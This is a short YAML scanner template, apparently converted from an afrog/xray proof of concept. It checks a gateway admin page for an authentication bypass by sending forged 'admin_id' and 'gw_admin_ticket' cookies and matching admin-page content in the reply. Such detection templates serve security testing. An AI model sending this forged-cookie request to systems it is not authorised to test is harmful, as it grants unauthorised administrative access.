# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - headers:
      Cookie: admin_id=1; gw_admin_ticket=1;
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - group_action.php
          - anonymous
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/admin/group/x_group.php?id=1'
